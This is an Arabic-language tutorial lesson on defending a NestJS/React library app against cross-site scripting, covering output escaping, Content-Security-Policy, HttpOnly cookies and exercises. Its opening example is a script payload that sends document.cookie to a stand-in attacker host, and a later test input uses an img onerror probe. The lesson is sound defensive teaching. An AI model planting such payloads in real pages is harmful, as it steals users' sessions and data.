XSS

الهدف من هذا الدرس

فهم حقن سكربت في صفحة تعرض محتوى المستخدم، وما الذي يحدّه في واجهة المكتبة مع API يرجع JSON.

المشكلة التي يحلها

Ada تكتب عنوان مقال <script>fetch('https://evil.example?c='+document.cookie)</script>. إن وضعت الواجهة العنوان داخل HTML خام، المتصفح ينفّذ السكربت في أصل المكتبة. الكعكة HttpOnly لا تُقرأ من document.cookie، لكن السكربت يستطيع إرسال طلبات بنفس الأصل، وتعديل الصفحة، وقراءة رمز إن كان في localStorage.

الفكرة ببساطة

XSS تنفيذ كود المهاجم داخل أصل الضحية. المصدر بيانات تُعرض كـ HTML. الدفاع في العرض: تهريب النص، و Content-Type الصحيح، و CSP التي تحد مصادر السكربت. API الذي يرجع JSON لا ينفّذ HTML بنفسه. الخطر يظهر حين يلصق العميل الحقل في DOM بلا تهريب.

التعريف التقني

لا حزمة Nest اسمها «فلتر XSS». الحماية موزعة:

  • الاستجابة Content-Type: application/json. الرأس X-Content-Type-Options: nosniff من useSecurityHeaders يمنع المتصفح من تخمين النوع وتنفيذ ملف.
  • Content-Security-Policy الافتراضي يقصر script-src على 'self'. سكربت من evil.example لا يُحمَّل. السكربت المضمّن ما زال يعتمد على بقية السياسة، لذلك لا تفتح 'unsafe-inline' في script-src للإنتاج.
  • كعكة __Host-sid بصفة HttpOnly لا تظهر في document.cookie.
  • الواجهة تعرض العنوان كنص. في React النص في {post.title} يُهرَّب. dangerouslySetInnerHTML يعرض HTML كما هو.

التحقق بـ class-validator يرفض شكلًا خاطئًا ولا يحوّل < إلى &lt;. التهريب عند الإخراج في الصفحة، أو عند توليد HTML على الخادم إن فعلت ذلك.

Mental Model

عنوان فيه وسم
  JSON يمر كما هو
  الواجهة كنص -> وسم ظاهر لا سكربت
  الواجهة innerHTML -> سكربت على أصل المكتبة
  CSP تحد من أين يُحمَّل السكربت

أبسط مثال

export function PostTitle({ title }: { title: string }) {
  return <h1>{title}</h1>;
}

شرح المثال

React يهرّب < في النص. الزائر يرى الوسوم حروفًا. الاستبدال بـ dangerouslySetInnerHTML={{ __html: title }} ينفّذ ما في العنوان. إن احتجت تنسيقًا، خزّن تنسيقًا محدودًا تعرفه أنت وحوّله إلى وسوم سمّيتها، ولا تمرّر HTML المؤلف إلى DOM.

على الخادم أبقِ title سلسلة في Prisma. لا تبنِ صفحة HTML بلصق العنوان داخل قالب نصي.

ماذا يحدث داخليًا؟

المتصفح يحلّل HTML ثم يشغّل السكربت في أصل الصفحة. الطلبات إلى API نفسه تُرفق معها كعكة الجلسة حسب صفاتها. لذلك XSS على أصل المكتبة يقدر أن ينشر مقالًا باسم الضحية حتى مع HttpOnly. CSRF يمنع أصلًا آخر. XSS نفس الأصل.

localStorage يقرأه أي سكربت على الأصل. لذلك رمز الدخول للواجهة لا يُحفظ هناك. الجوال الذي يخزّن التحديث خارج JavaScript الصفحة مسار مختلف، سبق في فصل الكعكات.

رابط javascript: في حقل يُعرض كـ href شكل آخر. اقبل https فقط إن كان الحقل عنوانًا.

مثال عملي

اختبار واجهة: عنوان المقال <img src=x onerror=alert(1)>. الصفحة التي تستخدم {post.title} لا تنبّه. الصفحة التي تستخدم HTML خام تنبّه. افحص أيضًا أن استجابة GET /posts/1 تبدأ بـ application/json وأن رأس CSP موجود بعد useSecurityHeaders. لا تحذف CSP لأن اختبارًا واحدًا احتاج سكربتًا خارجيًا. أضف المصدر المحدد.

أخطاء شائعة

  • «API يرجع JSON إذن XSS مستحيل». العميل قد يعرض الحقل HTML.
  • وضع accessToken في localStorage لأن الكعكة HttpOnly.
  • 'unsafe-inline' في script-src لتمرير واجهة.
  • تهريب مرة عند الحفظ ثم عرض مزدوج يظهر &amp;lt; أو يُفك لاحقًا في سياق HTML.
  • ظن أن IsString يزيل الوسوم.

متى نستخدمه؟

تهريب المخرجات و CSP كلما عُرض نص المستخدم في متصفح، حتى لو كان المصدر API.

متى لا نستخدمه؟

كبديل عن المصادقة. صفحة نظيفة ما زالت تقبل POST بلا هوية إن كان المسار عامًا. وكبديل عن فحص CSRF من أصل آخر.

مقارنة

عرض كنص عرض HTML خام
الوسوم حروف المتصفح ينفّذ
مناسب لعنوان مقال مناسب لتنسيق أنت بنيته
CSP طبقة إضافية سكربت مضمّن قد يمر إن ضعفت السياسة

تمارين

تمرين سهل

هل يرجع Nest خطأً لأن العنوان فيه <script>؟

الحل

لا، إن كان الحقل سلسلة مقبولة. الخطر عند عرضها HTML. JSON ينقل النص.

تمرين متوسط

لماذا تبقى كعكة HttpOnly غير كافية وحدها ضد XSS على نفس الأصل؟

الحل

السكربت لا يقرأها، لكنه يرسل طلبات بنفس الأصل فيرفقها المتصفح، فيقدر أن يغيّر بيانات الضحية.

تمرين متقدم

محرر غني يحفظ HTML المقال. ماذا تقبل في التخزين؟

الحل

قائمة وسوم وصفات سمّيتها بعد تنظيف صارم، أو تنسيقًا غير HTML تحوّله أنت. لا تمرّر HTML الزائر إلى innerHTML ولا تفتح 'unsafe-inline' لتعويض التنظيف.

أسئلة مراجعة

  • أين يُهرَّب عنوان المقال؟
  • ماذا يسرق XSS من localStorage؟
  • أي رأس يحد مصدر السكربت؟

الخلاصة

XSS تشغيل كود في أصلك عبر عرض غير مهرَّب. أعد النص نصًا، أبقِ CSP ضيقة، وأبقِ جلسة المتصفح في كعكة لا يقرأها السكربت.

ماذا بعد؟

SQL Injection حين يُلصق النص في الاستعلام.
